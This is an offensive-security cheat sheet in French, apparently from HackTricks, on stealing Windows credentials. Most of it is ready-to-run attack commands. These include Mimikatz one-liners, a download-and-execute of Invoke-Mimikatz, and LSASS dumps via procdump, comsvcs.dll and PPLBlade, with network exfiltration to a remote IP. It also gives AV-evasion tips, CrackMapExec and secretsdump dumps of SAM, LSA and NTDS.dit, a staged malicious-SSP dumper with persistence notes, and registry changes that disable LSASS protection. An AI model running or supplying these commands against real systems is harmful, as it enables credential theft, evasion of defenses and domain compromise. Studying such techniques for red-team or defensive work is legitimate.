# Vol de credentials sous Windows

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Trouvez d'autres choses que Mimikatz peut faire sur** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d'extraire certains credentials.**

## Credentials avec Meterpreter

Utilisez le [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** j'ai créé pour **rechercher des passwords et hashes** sur la machine victime.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Contourner AV

### Procdump + Mimikatz

Comme **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**est un outil Microsoft légitime**, il n'est pas détecté par Defender.\
Vous pouvez utiliser cet outil pour **dumper le processus lsass**, **télécharger le dump** et **extraire** les **identifiants localement** à partir du dump.

Vous pouvez aussi utiliser [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ce processus est effectué automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz) : `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Certains **AV** peuvent **détecter** comme **malicieux** l'utilisation de **procdump.exe to dump lsass.exe**, c'est parce qu'ils **détectent** la chaîne **"procdump.exe" et "lsass.exe"**. Il est donc **plus furtif** de **passer** comme **argument** le **PID** de lsass.exe à procdump **au lieu de** le **nom lsass.exe.**

### Dumping lsass avec **comsvcs.dll**

Une DLL nommée **comsvcs.dll** trouvée dans `C:\Windows\System32` est responsable du **dumping process memory** en cas de crash. Cette DLL inclut une **fonction** nommée **`MiniDumpW`**, conçue pour être invoquée en utilisant `rundll32.exe`.\
Il est sans importance d'utiliser les deux premiers arguments, mais le troisième est divisé en trois composants. L'ID du processus à dumper constitue la première composante, l'emplacement du fichier de dump représente la deuxième, et la troisième composante est strictement le mot **full**. Aucune option alternative n'existe.\
Après avoir analysé ces trois composantes, la DLL se charge de créer le fichier de dump et d'y transférer la mémoire du processus spécifié.\
L'utilisation de **comsvcs.dll** est possible pour dumper le processus lsass, supprimant ainsi le besoin de téléverser et d'exécuter procdump. Cette méthode est décrite en détail à [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Vous pouvez automatiser ce processus avec** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass avec le Gestionnaire des tâches**

1. Faites un clic droit sur la barre des tâches et cliquez sur le Gestionnaire des tâches
2. Cliquez sur Plus de détails
3. Dans l'onglet Processes, recherchez le processus "Local Security Authority Process"
4. Faites un clic droit sur le processus "Local Security Authority Process" et cliquez sur "Create dump file".

### Dumping lsass avec procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) est un binaire signé par Microsoft qui fait partie de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un Protected Process Dumper Tool qui prend en charge l'obfuscation des memory dump et leur transfert sur des remote workstations sans les enregistrer sur le disque.

**Fonctionnalités clés**:

1. Bypassing PPL protection
2. Obfuscating memory dump files to evade Defender signature-based detection mechanisms
3. Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – vidage de LSASS via SSP sans MiniDumpWriteDump

Ink Dragon fournit un dumper en trois étapes appelé **LalsDumper** qui n'appelle jamais `MiniDumpWriteDump`, donc les hooks EDR sur cette API ne se déclenchent jamais :

1. **Étape 1 — chargeur (`lals.exe`)** – recherche dans `fdp.dll` un espace réservé constitué de 32 caractères `d` en minuscules, le remplace par le chemin absolu vers `rtu.txt`, enregistre la DLL patchée sous le nom `nfdp.dll`, et appelle `AddSecurityPackageA("nfdp","fdp")`. Cela force **LSASS** à charger la DLL malveillante comme nouveau Security Support Provider (SSP).
2. **Étape 2 dans LSASS** – lorsque LSASS charge `nfdp.dll`, la DLL lit `rtu.txt`, effectue un XOR de chaque octet avec `0x20`, et mappe le blob décodé en mémoire avant de transférer l'exécution.
3. **Étape 3 — dumper** – le payload mappé réimplémente la logique de MiniDump en utilisant **direct syscalls** résolus à partir de noms d'API hachés (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Un export dédié nommé `Tom` ouvre `%TEMP%\<pid>.ddt`, écrit un dump compressé de LSASS dans le fichier, puis ferme le handle pour permettre une exfiltration ultérieure.

Notes opérateur :

* Gardez `lals.exe`, `fdp.dll`, `nfdp.dll` et `rtu.txt` dans le même répertoire. L'étape 1 réécrit l'espace réservé codé en dur avec le chemin absolu vers `rtu.txt`, donc les séparer casse la chaîne.
* L'enregistrement se fait en ajoutant `nfdp` à `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Vous pouvez initialiser cette valeur vous-même pour forcer LSASS à recharger le SSP à chaque démarrage.
* Les fichiers `%TEMP%\*.ddt` sont des dumps compressés. Décompressez-les localement, puis fournissez-les à Mimikatz/Volatility pour extraire les identifiants.
* L'exécution de `lals.exe` nécessite des droits admin/SeTcb pour que `AddSecurityPackageA` réussisse ; une fois l'appel terminé, LSASS charge de manière transparente le SSP malveillant et exécute l'étape 2.
* La suppression de la DLL du disque ne l'évince pas de LSASS. Supprimez l'entrée de registre et redémarrez LSASS (redémarrage) ou laissez-la pour une persistance à long terme.

## CrackMapExec

### Dump des hachages SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Extraire les secrets LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump du NTDS.dit depuis le DC cible
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Extraire l'historique des mots de passe de NTDS.dit depuis le DC cible
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Afficher l'attribut pwdLastSet pour chaque compte NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Ces fichiers doivent être **situés** dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM_. Mais **vous ne pouvez pas simplement les copier de façon normale** car ils sont protégés.

### Depuis le Registre

Le moyen le plus simple de steal ces fichiers est d'obtenir une copie depuis le Registre :
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Téléchargez** ces fichiers sur votre machine Kali et **extrayez les hachages** en utilisant :
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Vous pouvez effectuer une copie de fichiers protégés en utilisant ce service. Vous devez être Administrateur.

#### Utilisation de vssadmin

Le binaire vssadmin n'est disponible que dans les versions Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mais vous pouvez faire la même chose depuis **Powershell**. Voici un exemple de **comment copier le SAM file** (le disque dur utilisé est "C:" et il est enregistré dans C:\users\Public) mais vous pouvez utiliser ceci pour copier n'importe quel fichier protégé :
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code extrait du livre: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Enfin, vous pouvez aussi utiliser le [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) pour faire une copie de SAM, SYSTEM et ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Le fichier **NTDS.dit** est considéré comme le cœur de **Active Directory**, contenant des données essentielles sur les objets utilisateurs, les groupes et leurs appartenances. C'est là que sont stockés les **password hashes** des utilisateurs de domaine. Ce fichier est une base de données **Extensible Storage Engine (ESE)** et se trouve à **_%SystemRoom%/NTDS/ntds.dit_**.

Within this database, three primary tables are maintained:

- **Data Table**: Cette table stocke les détails des objets tels que les utilisateurs et les groupes.
- **Link Table**: Elle suit les relations, comme les appartenances aux groupes.
- **SD Table**: Les **Security descriptors** de chaque objet sont stockés ici, assurant la sécurité et le contrôle d'accès des objets stockés.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier ; cette DLL est utilisée par _lsass.exe_. De plus, une **partie** du fichier **NTDS.dit** peut se trouver **dans la mémoire du `lsass`** (vous pouvez y trouver les données les plus récemment accédées, probablement en raison de l'amélioration des performances liée à l'utilisation d'un **cache**).

#### Déchiffrement des hashes dans NTDS.dit

Le hash est chiffré 3 fois :

1. Déchiffrer le Password Encryption Key (**PEK**) en utilisant le **BOOTKEY** et **RC4**.
2. Déchiffrer le **hash** en utilisant **PEK** et **RC4**.
3. Déchiffrer le **hash** en utilisant **DES**.

Le **PEK** a la **même valeur** dans **chaque contrôleur de domaine**, mais il est **chiffré** à l'intérieur du fichier **NTDS.dit** en utilisant le **BOOTKEY** du fichier **SYSTEM** du contrôleur de domaine (différent entre contrôleurs de domaine). C'est pourquoi, pour obtenir les identifiants à partir du fichier **NTDS.dit**, **vous avez besoin des fichiers NTDS.dit et SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Disponible depuis Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Vous pouvez aussi utiliser l'astuce [**volume shadow copy**](#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez aussi besoin d'une copie du fichier **SYSTEM** (encore une fois, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) astuce).

### **Extraction des hashes depuis NTDS.dit**

Une fois que vous avez **obtenu** les fichiers **NTDS.dit** et **SYSTEM**, vous pouvez utiliser des outils comme _secretsdump.py_ pour **extraire les hashes** :
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Vous pouvez également **les extraire automatiquement** en utilisant un domain admin user valide :
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Pour les **gros fichiers NTDS.dit**, il est recommandé de les extraire en utilisant [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Enfin, vous pouvez aussi utiliser le **metasploit module** : _post/windows/gather/credentials/domain_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraction des objets de domaine depuis NTDS.dit vers une base de données SQLite**

Les objets NTDS peuvent être extraits dans une base SQLite avec [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non seulement les secrets sont extraits, mais aussi les objets complets et leurs attributs pour permettre une extraction d'informations plus approfondie lorsque le fichier brut NTDS.dit a déjà été récupéré.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
La ruche de registre `SYSTEM` est optionnelle mais permet le décryptage des secrets (NT & LM hashes, supplemental credentials tels que mots de passe en clair, kerberos ou trust keys, historiques de mot de passe NT & LM). Avec d'autres informations, les données suivantes sont extraites : comptes utilisateur et machine avec leurs hashes, flags UAC, horodatage du dernier logon et du changement de mot de passe, description des comptes, noms, UPN, SPN, groupes et appartenances récursives, arbre et appartenance des unités d'organisation, domaines de confiance avec le type de trusts, la direction et les attributs...

## Lazagne

Téléchargez le binaire depuis [here](https://github.com/AlessandroZ/LaZagne/releases). Vous pouvez utiliser ce binaire pour extraire des credentials de plusieurs logiciels.
```
lazagne.exe all
```
## Autres outils pour extraire des identifiants du SAM et de LSASS

### Windows credentials Editor (WCE)

Cet outil peut être utilisé pour extraire des identifiants depuis la mémoire. Téléchargez-le depuis : [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrait les identifiants du fichier SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraire les credentials du fichier SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **execute it** and the passwords will be extracted.

## Mining idle RDP sessions and weakening security controls

Le RAT FinalDraft d'Ink Dragon inclut un tasker `DumpRDPHistory` dont les techniques sont utiles à tout red-teamer :

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – parcourir chaque ruche utilisateur à `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Chaque sous-clé stocke le nom du serveur, `UsernameHint`, et le timestamp de dernière écriture. Vous pouvez reproduire la logique de FinalDraft avec PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – interroger le journal `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pour les Event IDs **21** (successful logon) et **25** (disconnect) afin de cartographier qui a administré la machine:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Une fois que vous savez quel Domain Admin se connecte régulièrement, dump LSASS (avec LalsDumper/Mimikatz) pendant que leur session **déconnectée** existe encore. CredSSP + NTLM fallback laisse leur verifier et leurs tokens dans LSASS, qui peuvent ensuite être rejoués via SMB/WinRM pour récupérer `NTDS.dit` ou préparer une persistence sur domain controllers.

### Registry downgrades targeted by FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Le paramètre `DisableRestrictedAdmin=1` force la réutilisation complète des credentials/tickets pendant RDP, permettant des pivots de type pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` désactive UAC token filtering de sorte que les local admins obtiennent des tokens non restreints sur le réseau.
* `DSRMAdminLogonBehavior=2` permet à l'administrateur DSRM de se connecter pendant que le DC est en ligne, offrant aux attackers un autre compte intégré à privilèges élevés.
* `RunAsPPL=0` supprime les protections LSASS PPL, rendant l'accès mémoire trivial pour des dumpers tels que LalsDumper.

## Références

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
